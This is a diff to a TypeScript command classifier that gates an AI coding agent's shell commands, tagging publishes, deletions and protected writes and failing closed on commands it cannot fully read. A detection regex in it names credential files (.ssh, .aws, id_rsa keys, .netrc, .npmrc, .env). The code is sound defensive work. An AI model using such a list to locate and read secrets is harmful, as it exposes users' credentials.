@@ -1,7 +1,10 @@
 import { realpathSync } from 'node:fs';
 import * as path from 'node:path';
+import { MAX_COMMAND_LENGTH, MAX_COMMAND_WORDS, MAX_NESTING } from '../domain/commandBounds';
 import { plainDownload } from '../domain/plainDownload';
 import { normalizeRelative, PROTECTED_WRITE, STATE_FOLDER_PATH, STATE_FOLDER_TEXT } from '../domain/protectedPaths';
+import { parsePathPattern } from '../domain/gate/vocabulary';
+import type { Capability, PublishTarget } from '../domain/gate/vocabulary';
 import { isSensitivePath } from './tools';
 
 // The deterministic half of the `auto` approval mode. It decides the clear cases on its own:
@@ -13,7 +16,30 @@ import { isSensitivePath } from './tools';
 
 export type CommandVerdict = 'safe' | 'risky' | 'unknown';
 
-export interface CommandClassification { verdict: CommandVerdict; reason: string }
+/**
+ * What a command does that the gate's floor must see (GATE-05, D-17, D-46), as a vocabulary capability rather than words in a reason (research 4.1): it
+ * publishes (or sends), it destroys, or it writes a protected place. Paths are project-relative; `**` stands for the whole tree or anything outside it.
+ */
+export type CommandEffect = Extract<Capability, { verb: 'publish' | 'send' | 'destroy' | 'workspaceWrite' | 'network' }>;
+
+export interface CommandClassification {
+  verdict: CommandVerdict;
+  reason: string;
+  /**
+   * Every effect the command shows, wherever it sits: inside a script `npm run` runs, after `&&`, in a substitution, under `bash -c`. Absent when there is
+   * none. It never changes the verdict or the reason; it only says what the command would do.
+   */
+  effects?: CommandEffect[];
+  /**
+   * Set, with the reason, when the classifier did not read the whole command: it nests deeper than MAX_NESTING, or it is longer than MAX_COMMAND_LENGTH
+   * or has more than MAX_COMMAND_WORDS words. `effects` is then only what was read before it stopped, not all the command does, so the gate must treat
+   * the command's effects as unknown (it asks with a person there and refuses with nobody), never as "none" (PR #74 review).
+   */
+  effectsUnknown?: string;
+}
+
+// The bounds are shared with the credential-store check (src/domain/commandBounds.ts), so neither reads what the other gives up on.
+export { MAX_COMMAND_LENGTH, MAX_COMMAND_WORDS, MAX_NESTING };
 
 export interface CommandContext {
   /** The workspace root (absolute). */
@@ -43,16 +69,120 @@ export interface CommandContext {
   /** Set while classifying what follows a trusted preamble: `gsd_run` is the managed gsd-tools. */
   gsdRunDefined?: boolean;
   /**
+   * The system's temporary folders, absolute, as the caller resolved them (the temporary folder, its real path, and TMPDIR when set: systemTemporaryRoots in
+   * the gate adapter). Given, the classifier reads no environment for them; absent, it falls back to `/tmp`, `/var/tmp` and TMPDIR, as it always has. A
+   * delete inside one (not of the folder itself, nor of a folder holding the project or the home folder) is scratch work, not destruction (PR #74 review).
+   */
+  temporaryRoots?: readonly string[];
+  /**
    * Whether one simple command (plain words, no operators) is on the user's allow list
    * (nearAi.agent.allowCommands, including "always allow" choices). Each part of a chained
    * command is checked on its own, so `cd app && git push` is covered by "git push".
    */
   isAllowListed?(command: string): boolean;
+  /**
+   * The package.json scripts a package manager run in `folder` would use: the nearest package.json at or above it (PackageScriptsReader). Given, `npm run x`
+   * reads the folder the command really runs in (the shell's folder, any cd or pushd earlier on the line, --prefix, -C, --cwd, --workspace); absent, the
+   * classifier falls back to `packageScripts` (the project root's) for the root and treats any other folder as unknown (PR #74 review round 4).
+   */
+  packageScriptsAt?(folder: string): PackageScriptsAt;
+}
+
+/** What the package.json a package manager would use in a folder says. */
+export type PackageScriptsAt =
+  | { readonly kind: 'found'; readonly folder: string; readonly scripts: Readonly<Record<string, string>> }
+  /** No package.json at or above the folder. */
+  | { readonly kind: 'none' }
+  /** There is one, but it could not be read or parsed. */
+  | { readonly kind: 'unreadable'; readonly folder: string }
+  /** The one that would be used is outside the project. */
+  | { readonly kind: 'outside'; readonly folder: string };
+
+// Effects are gathered for the whole classifyCommand call, not handed back result by result: the classifier often rebuilds a result from an inner one
+// (`npm run x`, `xargs`, `find -exec`, a substitution) or decides on one part and stops, and a tag carried by hand through each of those would be lost in the
+// next one somebody writes (Pitfall 2). Classification is synchronous, so the frame on top of this stack is always the call being made.
+// The frame also keeps whether the classifier stopped reading somewhere (the bound, the caps): wherever that happens, the whole command's effects are unknown.
+interface EffectFrame { effects: CommandEffect[]; unknown?: string }
+const effectFrames: EffectFrame[] = [];
+
+function noteEffects(effects: readonly CommandEffect[] | undefined): void {
+  const frame = effectFrames[effectFrames.length - 1];
+  if (frame !== undefined && effects !== undefined) frame.effects.push(...effects);
+}
+
+/** Where the current frame ends now, so a caller can see what one inner classification added. */
+function effectMark(): number {
+  return effectFrames[effectFrames.length - 1]?.effects.length ?? 0;
+}
+
+function effectsSince(mark: number): readonly CommandEffect[] {
+  return effectFrames[effectFrames.length - 1]?.effects.slice(mark) ?? [];
+}
+
+/**
+ * The classifier stops reading here. The verdict is unknown, and the command's effects are unknown too: what it has found so far is not everything the
+ * command does, so the gate must not read the tags it has as the whole story (fail closed, PR #74 review).
+ */
+function beyondReach(reason: string): CommandClassification {
+  return unknown(reason);
+}
+
+/** The command was not read whole: its effects are unknown. */
+function markUnread(reason: string): void {
+  const frame = effectFrames[effectFrames.length - 1];
+  if (frame !== undefined) frame.unknown ??= reason;
+}
+
+/** The one nesting bound, checked first by both entry points every recursive path goes through (classifyText and classifyWords). */
+function tooDeep(depth: number): CommandClassification | undefined {
+  return depth > MAX_NESTING ? beyondReach('the command nests too deeply to check') : undefined;
+}
+
+function classification(verdict: CommandVerdict, reason: string, effects?: readonly CommandEffect[]): CommandClassification {
+  noteEffects(effects);
+  return effects !== undefined && effects.length > 0 ? { verdict, reason, effects: [...effects] } : { verdict, reason };
 }
 
 const safe = (reason: string): CommandClassification => ({ verdict: 'safe', reason });
-const risky = (reason: string): CommandClassification => ({ verdict: 'risky', reason });
-const unknown = (reason: string): CommandClassification => ({ verdict: 'unknown', reason });
+const risky = (reason: string, effects?: readonly CommandEffect[]): CommandClassification => classification('risky', reason, effects);
+/**
+ * An unknown verdict where the classifier stopped short of reading the whole command (an option it does not know, a command it cannot parse, a target
+ * decided at run time): the command's effects are unknown too. This is the default, so an early return can never report a complete effect list it did
+ * not read (PR #74 review round 8). A path that did read the whole command and only cannot judge it says so with unknownRead.
+ */
+const unknown = (reason: string, effects?: readonly CommandEffect[]): CommandClassification => { markUnread(reason); return classification('unknown', reason, effects); };
+/**
+ * An unknown verdict for a command the classifier read whole: every word was interpreted and every effect it can see is tagged; it only cannot judge
+ * whether the command is safe (a script it does not read, a network call, a program it does not know but whose words it probed). Each use is listed, with
+ * an input that reaches it, in commandReadWhole.test.ts.
+ */
+const unknownRead = (reason: string, effects?: readonly CommandEffect[]): CommandClassification => classification('unknown', reason, effects);
+
+/** One copy of each effect, in the order first seen. */
+function distinctEffects(effects: readonly CommandEffect[]): CommandEffect[] {
+  const seen = new Set<string>();
+  const out: CommandEffect[] = [];
+  for (const effect of effects) {
+    const key = JSON.stringify(effect);
+    if (seen.has(key)) continue;
+    seen.add(key);
+    out.push(effect);
+  }
+  return out;
+}
+
+const publishTo = (target: PublishTarget): CommandEffect[] => [{ verb: 'publish', target }];
+/** The whole tree: a delete or rewrite the classifier cannot narrow to named paths (history, a branch, every match of a find). */
+const DESTROY_ALL: CommandEffect[] = [{ verb: 'destroy', paths: ['**'] }];
+
+/** One copy of each path; `**` alone when any of them is the whole tree. */
+function effectPaths(paths: readonly string[]): string[] {
+  if (paths.length === 0 || paths.includes('**')) return ['**'];
+  return [...new Set(paths)];
+}
+
+const destroyPaths = (paths: readonly string[]): CommandEffect[] => [{ verb: 'destroy', paths: effectPaths(paths) }];
+const writePaths = (paths: readonly string[]): CommandEffect[] => (paths.length ? [{ verb: 'workspaceWrite', paths: effectPaths(paths) }] : []);
 
 // ---------------------------------------------------------------------------------------------
 // Lexing
@@ -87,6 +217,8 @@ interface Lexed {
   opaque?: string;
   /** Unterminated quotes or substitutions: the structure itself is unknown. */
   broken?: string;
+  /** Parentheses grouped part of the line: a cd inside them does not carry past them, which a line read in order cannot tell. */
+  subshell?: boolean;
 }
 
 const GLOB_CHARS = new Set(['*', '?', '[', '{']);
@@ -115,6 +247,7 @@ function lex(command: string): Lexed {
   const substitutions: string[] = [];
   let opaque: string | undefined;
   const markOpaque = (reason: string) => { opaque = opaque ?? reason; };
+  let subshell = false;
   let segment: Segment = { words: [], redirects: [] };
   let word: Word | undefined;
   let pendingRedirect: Redirect | undefined;
@@ -290,6 +423,7 @@ function lex(command: string): Lexed {
     if (char === '(' || char === ')') {
       // Subshells and groups: their commands are still checked, but the whole is never `safe`.
       markOpaque('it runs a subshell');
+      subshell = true;
       const problem = endSegment(';');
       if (problem) return { segments, substitutions, broken: problem };
       continue;
@@ -307,7 +441,7 @@ function lex(command: string): Lexed {
   // A trailing operator (`ls &&`) leaves the shell waiting for more.
   const last = segments.at(-1);
   if (last?.next && last.next !== ';' && last.next !== '&') return { segments, substitutions, broken: `the command ends with "${last.next}"` };
-  return { segments, substitutions, opaque };
+  return { segments, substitutions, opaque, ...(subshell ? { subshell } : {}) };
 }
 
 // ---------------------------------------------------------------------------------------------
@@ -341,6 +475,63 @@ function pathFacts(text: string, cwd: string, context: CommandContext): PathFact
   return { absolute, inside, sensitive: sensitive || realSensitive, protectedWrite: inside && PROTECTED_WRITE.test(normalizeRelative(relative)), device: DEVICES.has(absolute), trusted, scratch };
 }
 
+/**
+ * A path as an effect names it: project-relative inside the workspace, or `**` for the workspace itself, anywhere outside it, or a path the shell decides
+ * at run time. Always a pattern the vocabulary accepts.
+ */
+function effectPath(word: Word | string, state: SegmentState, context: CommandContext): string {
+  if (typeof word !== 'string' && word.expansion) return '**';
+  const text = typeof word === 'string' ? word : valuePart(word.text);
+  const facts = pathFacts(text, state.cwd, context);
+  if (!facts.inside) return '**';
+  const parsed = parsePathPattern(path.relative(path.resolve(context.root), facts.absolute).split(path.sep).join('/'), 'path');
+  return parsed.ok ? parsed.value : '**';
+}
+
+/**
+ * The writes a command makes to targets named in its text, tagged `workspaceWrite` on their project-relative paths, so the floor sees a protected one
+ * (.git/, .near-ai/) and an ordinary one runs as the settings allow (PR #74 review round 8: a write the text names is read whole, not unknown). A target in a
+ * temporary or scratch folder, or a device, needs no tag. Undefined when a target cannot be told from the text: decided at run time, a wildcard that may
+ * reach outside the project, or outside the project and not scratch.
+ */
+function writesNamed(targets: readonly Word[], state: SegmentState, context: CommandContext): CommandEffect[] | undefined {
+  const paths: string[] = [];
+  for (const target of targets) {
+    if (target.expansion) return undefined;
+    if (target.glob) {
+      if (!isWorkspaceGlob(target, state, context)) return undefined;
+      paths.push(effectPath(target, state, context));
+      continue;
+    }
+    const facts = pathFacts(target.text, state.cwd, context);
+    if (facts.device) continue;
+    if (!facts.inside) {
+      if (facts.scratch) continue;
+      return undefined;
+    }
+    paths.push(effectPath(target, state, context));
+  }
+  return writePaths(paths);
+}
+
+/** A write the text names: read whole and tagged, or not read whole when a target cannot be told (see writesNamed). */
+function writeResult(reason: string, targets: readonly Word[], state: SegmentState, context: CommandContext, verdict: 'unknown' | 'risky' | 'safe' = 'unknown'): CommandClassification {
+  const effects = writesNamed(targets, state, context);
+  if (effects === undefined) {
+    // A risky answer stays risky; its effects are unknown all the same.
+    if (verdict === 'risky') { markUnread(reason); return risky(reason); }
+    return unknown(`${reason}, to a place decided at run time or outside the project`);
+  }
+  if (verdict === 'risky') return risky(reason, effects);
+  if (verdict === 'safe') { noteEffects(effects); return safe(reason); }
+  return unknownRead(reason, effects);
+}
+
+/** Whether a path the command writes is one of the places where writes always ask (D-44: the floor itself exempts team.md, as the file tools do). */
+function protectedWriteEffects(words: readonly Word[], state: SegmentState, context: CommandContext): CommandEffect[] {
+  const paths = words.filter((word) => !word.expansion && !looksLikeOption(word.text) && pathFacts(word.text, state.cwd, context).protectedWrite).map((word) => effectPath(word, state, context));
+  return writePaths(paths);
+}
 
 /**
  * The system's temporary folders, accepted as scratch space (owner, 2026-11-06: "accept it if gsd does keep using /tmp while also ensuring it's
@@ -356,13 +547,20 @@ function realPathOrSelf(target: string): string {
   try { return realpathSync(target); } catch { return target; }
 }
 
+/** The temporary folders the caller named, or the old fallback (`/tmp`, `/var/tmp`, TMPDIR) for a caller that names none. Absolute, unfiltered. */
+function temporaryCandidates(context: CommandContext): string[] {
+  const given = context.temporaryRoots;
+  if (given !== undefined) return given.filter((entry) => entry !== '' && path.isAbsolute(entry)).map((entry) => path.resolve(entry));
+  return ['/tmp', '/var/tmp', ...(process.env.TMPDIR ? [process.env.TMPDIR] : [])].map((entry) => path.resolve(entry));
+}
+
 function scratchRoots(context: CommandContext): string[] {
   // 0.4.18 review: the run is told to keep its helpers in the project's own scratch folder (.near-ai/scratch/), so that folder must count as scratch
   // too. It is inside the workspace, so it is already allowed for reads and writes; this makes a SCRIPT there runnable once the run itself wrote it.
   const projectScratch = path.join(path.resolve(context.root), '.near-ai', 'scratch');
   const home = context.home ? path.resolve(context.home) : undefined;
   const root = path.resolve(context.root);
-  const candidates = ['/tmp', '/var/tmp', ...(process.env.TMPDIR ? [process.env.TMPDIR] : [])].map((entry) => path.resolve(entry));
+  const candidates = temporaryCandidates(context);
   // 0.4.18 review: TMPDIR comes from the extension's own environment, so a TMPDIR of the home folder or of `/` would make the whole home or the whole
   // filesystem "scratch". A root is accepted only when it is a real temporary folder: not `/`, not the home folder, not the workspace, and not an
   // ancestor of either.
@@ -417,6 +615,148 @@ function valuePart(text: string): string {
 
 const looksLikeOption = (text: string) => /^-/.test(text) && text !== '-' && text !== '--';
 
+/**
+ * A program's own global options, which come before its subcommand: those that take a value (as the next word, or after `=`), the flags that take none,
+ * and the ones among the value options that move the folder the subcommand works in.
+ */
+export interface GlobalOptions {
+  readonly values: readonly string[];
+  readonly flags: readonly string[];
+  readonly moves?: readonly string[];
+}
+
+const PACKAGE_MANAGER_FLAGS = ['-g', '--global', '-s', '--silent', '-q', '--quiet', '-d', '--verbose', '-y', '--yes', '--dry-run', '--force', '-f', '--json', '--offline',
+  '--prefer-offline', '--ignore-scripts', '--legacy-peer-deps', '--no-audit', '--no-fund', '--no-progress', '--no-color', '--frozen-lockfile', '--immutable', '--production'];
+
+/**
+ * Every program the classifier tags by its subcommand, with its global options (PR #74 review round 7). A value option hid the subcommand
+ * (`docker --context prod push`, `git -C repo push`, `kubectl -n prod apply`), so the subcommand is read only after these are skipped; an option before
+ * the subcommand that is not listed here makes the command's effects unknown. `--help`, `-h` and `--version` are flags of every one of them. npm, pnpm,
+ * yarn and bun skip theirs in classifyPackageManager, after their folder options (--prefix, -C, --cwd, --dir, --workspace) are read there.
+ */
+export const GLOBAL_OPTIONS: Readonly<Record<string, GlobalOptions>> = Object.freeze({
+  git: {
+    values: ['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--super-prefix', '--config-env', '--attr-source'],
+    flags: ['--no-pager', '-p', '--paginate', '-P', '--bare', '--no-replace-objects', '--literal-pathspecs', '--glob-pathspecs', '--noglob-pathspecs', '--icase-pathspecs',
+      '--no-optional-locks', '--no-lazy-fetch', '--no-advice'],
+    moves: ['-C']
+  },
+  docker: {
+    values: ['--config', '-c', '--context', '-H', '--host', '-l', '--log-level', '--tlscacert', '--tlscert', '--tlskey'],
+    flags: ['-D', '--debug', '--tls', '--tlsverify']
+  },
+  podman: {
+    values: ['--connection', '-c', '--url', '--identity', '--log-level', '--root', '--runroot', '--storage-driver', '--storage-opt', '--cgroup-manager', '--events-backend',
+      '--hooks-dir', '--network-cmd-path', '--runtime', '--tmpdir', '--module', '--conmon', '--imagestore', '--network-config-dir', '--volumepath', '--ssh'],
+    flags: ['-r', '--remote', '--syslog', '--noout']
+  },
+  kubectl: {
+    values: ['--context', '--cluster', '--user', '-n', '--namespace', '--kubeconfig', '-s', '--server', '--token', '--as', '--as-group', '--as-uid', '--request-timeout', '-v', '--v',
+      '--certificate-authority', '--client-certificate', '--client-key', '--cache-dir', '--password', '--username', '--profile', '--profile-output', '--tls-server-name',
+      '--log-flush-frequency', '--vmodule', '--log-file'],
+    flags: ['--insecure-skip-tls-verify', '--match-server-version', '--warnings-as-errors', '--disable-compression']
+  },
+  oc: {
+    values: ['--context', '--cluster', '--user', '-n', '--namespace', '--kubeconfig', '-s', '--server', '--token', '--as', '--as-group', '--request-timeout', '-v', '--v',
+      '--certificate-authority', '--client-certificate', '--client-key', '--cache-dir'],
+    flags: ['--insecure-skip-tls-verify', '--match-server-version']
+  },
+  helm: {
+    values: ['--kube-context', '--kubeconfig', '-n', '--namespace', '--kube-apiserver', '--kube-as-user', '--kube-as-group', '--kube-ca-file', '--kube-token', '--registry-config',
+      '--repository-cache', '--repository-config', '--burst-limit', '--qps', '--kube-tls-server-name'],
+    flags: ['--debug', '--kube-insecure-skip-tls-verify']
+  },
+  terraform: { values: ['-chdir'], flags: [], moves: ['-chdir'] },
+  tofu: { values: ['-chdir'], flags: [], moves: ['-chdir'] },
+  pulumi: {
+    values: ['-C', '--cwd', '--color', '-v', '--verbose', '--tracing', '--profiling', '--memprofilerate'],
+    flags: ['--non-interactive', '--emoji', '--disable-integrity-checking', '--logtostderr', '--logflow', '-e'],
+    moves: ['-C', '--cwd']
+  },
+  cdk: {
+    values: ['-a', '--app', '-c', '--context', '--profile', '--proxy', '--ca-bundle-path', '-o', '--output', '--role-arn', '--plugin', '-p'],
+    flags: ['-v', '--verbose', '--debug', '--json', '-j', '--strict', '--ci', '--no-color', '--lookups', '--ignore-errors', '--trace']
+  },
+  serverless: { values: ['--stage', '-s', '--region', '-r', '--config', '-c', '--aws-profile', '--param', '--org', '--app'], flags: ['--verbose', '--debug'] },
+  sls: { values: ['--stage', '-s', '--region', '-r', '--config', '-c', '--aws-profile', '--param', '--org', '--app'], flags: ['--verbose', '--debug'] },
+  gh: { values: ['-R', '--repo', '--hostname'], flags: [] },
+  glab: { values: ['-R', '--repo'], flags: [] },
+  cargo: { values: ['--color', '--config', '-Z', '-C'], flags: ['-v', '-vv', '--verbose', '-q', '--quiet', '--frozen', '--locked', '--offline'], moves: ['-C'] },
+  vsce: { values: [], flags: [] },
+  ovsx: { values: [], flags: [] },
+  gem: { values: [], flags: ['-q', '--quiet', '--verbose', '--backtrace', '--debug', '--norc'] },
+  aws: {
+    values: ['--profile', '--region', '--output', '--endpoint-url', '--query', '--color', '--cli-read-timeout', '--cli-connect-timeout', '--ca-bundle', '--cli-binary-format'],
+    flags: ['--debug', '--no-verify-ssl', '--no-paginate', '--no-sign-request', '--no-cli-pager', '--no-cli-auto-prompt', '--cli-auto-prompt']
+  },
+  gcloud: {
+    values: ['--project', '--account', '--configuration', '--verbosity', '--format', '--flags-file', '--impersonate-service-account', '--billing-project', '--trace-token'],
+    flags: ['--quiet', '-q', '--log-http', '--user-output-enabled', '--no-user-output-enabled']
+  },
+  az: { values: ['--subscription', '--output', '-o', '--query'], flags: ['--debug', '--verbose', '--only-show-errors'] },
+  gsutil: { values: ['-o', '-h', '-u', '-i'], flags: ['-m', '-D', '-DD', '-d', '-q'] },
+  npm: { values: ['--registry', '--userconfig', '--globalconfig', '--location', '--loglevel', '--tag', '--access', '--otp', '--scope', '--cache', '--color'], flags: PACKAGE_MANAGER_FLAGS },
+  pnpm: { values: ['--registry', '--loglevel', '--reporter', '--tag', '--access', '--otp', '--color'], flags: PACKAGE_MANAGER_FLAGS },
+  yarn: { values: ['--registry', '--loglevel', '--cache-folder', '--modules-folder'], flags: PACKAGE_MANAGER_FLAGS },
+  bun: { values: ['--registry', '--tag', '--access', '--otp'], flags: PACKAGE_MANAGER_FLAGS }
+} satisfies Record<string, GlobalOptions>);
+
+/** Flags every program in GLOBAL_OPTIONS takes before a subcommand (or instead of one). */
+const UNIVERSAL_FLAGS: ReadonlySet<string> = new Set(['--help', '-h', '--version']);
+/** The package managers, whose global options classifyPackageManager skips itself (after their folder options). */
+const PACKAGE_MANAGERS: ReadonlySet<string> = new Set(['npm', 'pnpm', 'yarn', 'bun']);
+
+/**
+ * The words after a program's global options (GLOBAL_OPTIONS), which begin with its subcommand; whether any of the options took a value, and the folder an
+ * option moves the subcommand to. An option that is not listed is reported: what follows it cannot be told apart from its value.
+ */
+function skipGlobals(name: string, args: readonly Word[]): { rest: Word[]; valued: boolean; skipped: string[]; folder?: Word } | { unknown: string } {
+  const spec = GLOBAL_OPTIONS[name];
+  if (spec === undefined) return { rest: [...args], valued: false, skipped: [] };
+  const values = new Set(spec.values);
+  const flags = new Set([...spec.flags, ...UNIVERSAL_FLAGS]);
+  const shortValues = spec.values.filter((option) => /^-[A-Za-z]$/.test(option)).map((option) => option[1]!);
+  const shortFlags = spec.flags.filter((option) => /^-[A-Za-z]$/.test(option)).map((option) => option[1]!);
+  const skipped: string[] = [];
+  let valued = false;
+  let folder: Word | undefined;
+  let index = 0;
+  while (index < args.length) {
+    const word = args[index]!;
+    const text = word.text;
+    if (text === '--') { index += 1; break; }
+    // cargo +nightly publish: a toolchain comes before the subcommand.
+    if (name === 'cargo' && index === 0 && /^\+[\w.-]+$/.test(text)) { skipped.push(text); index += 1; continue; }
+    if (!looksLikeOption(text)) break;
+    const equals = text.indexOf('=');
+    const option = equals > 0 ? text.slice(0, equals) : text;
+    if (values.has(option)) {
+      const value = equals > 0 ? { ...word, text: text.slice(equals + 1) } : args[index + 1];
+      if (value === undefined) return { unknown: `${option} without its value` };
+      if (spec.moves?.includes(option)) folder = value;
+      skipped.push(option);
+      valued = true;
+      index += equals > 0 ? 1 : 2;
+      continue;
+    }
+    if (flags.has(text)) { skipped.push(text); index += 1; continue; }
+    // -nprod (a short value attached) and -qv (short flags together).
+    if (/^-[A-Za-z]/.test(text) && !text.startsWith('--') && equals < 0) {
+      const letters = text.slice(1);
+      if (letters.length > 1 && shortValues.includes(letters[0]!)) {
+        if (spec.moves?.includes(`-${letters[0]}`)) folder = { ...word, text: letters.slice(1) };
+        skipped.push(`-${letters[0]}`);
+        valued = true;
+        index += 1;
+        continue;
+      }
+      if ([...letters].every((letter) => shortFlags.includes(letter))) { skipped.push(text); index += 1; continue; }
+    }
+    return { unknown: `${text} is an option of ${name} the rules do not know, so its subcommand cannot be told` };
+  }
+  return { rest: args.slice(index), valued, skipped, ...(folder === undefined ? {} : { folder }) };
+}
+
 /** The raw text names a credential or knowledge-base path anywhere (also inside quotes and substitutions). */
 const SENSITIVE_TEXT_BASE = /\.near-credentials|\.near-kb\b|\.kbkey\b|state\.vscdb|(?:^|[\s/'"=:])\.ssh(?:\/|\b)|(?:^|[\s/'"=:])\.aws(?:\/|\b)|(?:^|[\s/'"=:<>])\.env(?:\.[\w.-]+)?(?=$|[\s'"/;&|)<>])|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.git-credentials|\.netrc\b|\.npmrc\b|\.pypirc\b/i;
 /** Plus the project's state folder (its keys must not reach a model request through a recursive read or a copy). */
@@ -445,8 +785,46 @@ const DEV_TOOLS = new Set(['tsc', 'eslint', 'prettier', 'jest', 'vitest', 'mocha
 /** Environment variables that only change output or test settings. */
 const HARMLESS_ENV = new Set(['CI', 'NODE_ENV', 'FORCE_COLOR', 'NO_COLOR', 'DEBUG', 'TZ', 'LANG', 'LC_ALL', 'RUST_BACKTRACE', 'PYTHONDONTWRITEBYTECODE', 'PYTHONUNBUFFERED', 'TERM', 'COLUMNS']);
 const RELEASE_NAME = /(?:^|[:_-])(?:publish|release|deploy|ship|upload|push)(?:$|[:_-])/i;
+/** Where each publishing tool publishes to, for its effect tag (D-46). A tool not listed here that the rules call a release is a `release`. */
+const PUBLISH_TOOL_TARGETS: Readonly<Record<string, PublishTarget>> = Object.freeze({
+  vsce: 'registry', '@vscode/vsce': 'registry', ovsx: 'registry', twine: 'registry', gem: 'registry',
+  vercel: 'deploy', netlify: 'deploy', firebase: 'deploy', wrangler: 'deploy', fly: 'deploy', flyctl: 'deploy', heroku: 'deploy', 'gh-pages': 'deploy',
+  serverless: 'deploy', sls: 'deploy', cdk: 'deploy',
+  'semantic-release': 'release', 'release-it': 'release', np: 'release', changeset: 'release', lerna: 'release'
+});
+/** Shell keywords and wrappers that run the words after them: what those words do is read for effects; the verdict is the rules' own. */
+const RUNS_WHAT_FOLLOWS = new Set(['{', '!', 'if', 'then', 'else', 'elif', 'while', 'until', 'do', 'exec', 'setsid']);
+/** sudo, doas and pkexec options that take a value. */
+const PRIVILEGE_VALUE_OPTIONS = new Set(['-u', '-g', '-C', '-h', '-p', '-U', '-r', '-t', '-T', '-D', '-R', '--user', '--group', '--close-from', '--host', '--prompt', '--other-user', '--role', '--type', '--command-timeout', '--chdir', '--chroot']);
+/** Shells whose `-c` script is read for what it does (fish and the csh family too: their scripts are read as sh, which is enough to see a push). */
+const SHELLS = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', 'fish', 'csh', 'tcsh']);
+/**
+ * Programs whose command the rules can tag (publishing, destruction, a protected write), or that run one the rules read (a runner, a shell, a privilege
+ * wrapper). After a program the rules do not know, one of these among its later words may be what it runs, so it is read there; if it tags anything,
+ * the whole command's effects are unknown (PR #74 review round 2: the next wrapper nobody listed fails closed, not open).
+ */
+const TAGGED_PROGRAMS: ReadonlySet<string> = new Set([
+  'git', 'npm', 'pnpm', 'yarn', 'bun', 'npx', 'docker', 'podman', 'kubectl', 'helm', 'oc', 'terraform', 'tofu', 'pulumi', 'cdk', 'serverless', 'sls', 'gh', 'glab',
+  'aws', 'az', 'gcloud', 'gsutil', 'near', 'cargo', 'gem', 'make', 'gmake', 'find', 'sed', 'gsed', 'gsd_run', 'gsd-tools.cjs',
+  'env', 'time', 'timeout', 'nice', 'nohup', 'command', 'stdbuf', 'flock', 'watch', ...RUNS_WHAT_FOLLOWS,
+  ...Object.keys(PUBLISH_TOOL_TARGETS), ...DISK_DESTROYERS, ...DELETERS, ...WORKSPACE_WRITERS, ...PRIVILEGE, ...INTERPRETERS, ...SHELLS
+]);
+/** More candidate words than this after an unknown program are not each read: the effects are unknown. */
+const MAX_RUNNER_PROBES = 16;
+/** stdbuf's mode options: `-o L` takes its mode as the next word, `-oL` and `--output=L` carry it. */
+const STDBUF_OPTION = /^-[ioe].+$|^--(?:input|output|error)=.+$/;
+/** flock's options that take a value as the next word, and its flags. */
+const FLOCK_VALUE_OPTIONS = new Set(['-w', '--wait', '--timeout', '-E', '--conflict-exit-code']);
+const FLOCK_FLAGS = /^-[sxenuoF]+$|^--(?:shared|exclusive|nonblock|nb|unlock|close|no-fork|verbose)$|^--(?:wait|timeout|conflict-exit-code)=\S+$|^-[wE]\d+$/;
+/** watch's options that take a value as the next word, and its flags. */
+const WATCH_VALUE_OPTIONS = new Set(['-n', '--interval', '-q', '--equexit']);
+const WATCH_FLAGS = /^-[dtbegcCxpwr]+$|^--(?:differences(?:=\w+)?|no-title|beep|errexit|chgexit|color|no-color|exec|precise|no-wrap|no-rerun)$|^--(?:interval|equexit)=\S+$|^-n[\d.]+$/;
 
-interface SegmentState { cwd: string }
+interface SegmentState {
+  cwd: string;
+  /** Why the shell's folder at this point of the line cannot be known (a cd to a run-time folder, popd, a cd inside parentheses), when it cannot. */
+  cwdUnknown?: string;
+}
 
 const XARGS_VALUE_OPTIONS = new Set(['-n', '-L', '-P', '-I', '-d', '-s', '-E', '-a', '--max-args', '--max-lines', '--max-procs', '--delimiter', '--arg-file', '--replace', '--eof']);
 
@@ -476,7 +854,7 @@ function checkReads(args: Word[], state: SegmentState, context: CommandContext, 
     if (allowTrusted && facts.trusted && !facts.inside) { readsTrusted = true; continue; }
     // 0.4.18: a file in the system's temporary folder is accepted scratch work, which is where Open-GSD's helper scripts and their data live.
     if (facts.scratch) { scratchRead = true; continue; }
-    if (!facts.inside && !facts.device) return unknown(`${label} names ${value}, which is outside the workspace`);
+    if (!facts.inside && !facts.device) return unknownRead(`${label} names ${value}, which is outside the workspace`);
   }
   if (scratchRead) return safe(`${label} reads inside the workspace and a temporary folder`);
   // 0.4.18: the trusted roots are the managed Open-GSD runtime and the person's own team library, both of which NEAR AI installed or wrote.
@@ -498,22 +876,24 @@ function classifyGsdTools(args: Word[], state: SegmentState, context: CommandCon
   for (const [at, word] of words.entries()) {
     const option = /^--(cwd|project-dir|config-dir)(?:=(.*))?$/.exec(word);
     if (!option) continue;
-    if (option[1] === 'config-dir') return unknown('gsd-tools --config-dir works on another configuration folder');
+    if (option[1] === 'config-dir') return unknownRead('gsd-tools --config-dir works on another configuration folder');
     const value = option[2] ?? words[at + 1];
-    if (!value || !pathFacts(value, state.cwd, context).inside) return unknown(`gsd-tools --${option[1]} points outside the workspace`);
+    if (!value || !pathFacts(value, state.cwd, context).inside) return unknownRead(`gsd-tools --${option[1]} points outside the workspace`);
   }
   const positional = words.filter((word) => !looksLikeOption(word));
   const command = positional[0] === 'query' ? positional[1] ?? '' : positional[0] ?? '';
   const verb = command.split('.')[0];
   const label = `gsd-tools ${positional[0] === 'query' ? 'query ' : ''}${command}`.trim();
-  if (GSD_RISKY_VERBS.has(verb) || [...positional.slice(0, 3), ...command.split('.')].some((word) => RELEASE_NAME.test(word))) return risky(`${label} pushes, publishes, or changes another repository`);
-  if (GSD_UNCHECKED_VERBS.has(verb)) return unknown(`${label} can reach the network or folders outside the workspace`);
+  if (GSD_RISKY_VERBS.has(verb) || [...positional.slice(0, 3), ...command.split('.')].some((word) => RELEASE_NAME.test(word))) return risky(`${label} pushes, publishes, or changes another repository`, publishTo(GSD_RISKY_VERBS.has(verb) ? 'git-remote' : 'release'));
+  if (GSD_UNCHECKED_VERBS.has(verb)) return unknownRead(`${label} can reach the network or folders outside the workspace`);
   const reads = checkReads(args, state, context, label, true);
   return reads.verdict === 'safe' ? safe(`${label} runs Open-GSD's own tool from the runtime NEAR AI installed`) : reads;
 }
 
 /** Checks the targets of a command that writes files: outside the workspace, credentials, or protected folders are risky. */
 function checkWrites(args: Word[], state: SegmentState, context: CommandContext, label: string): CommandClassification {
+  // Every protected target is tagged, also the ones after the argument that decides the verdict.
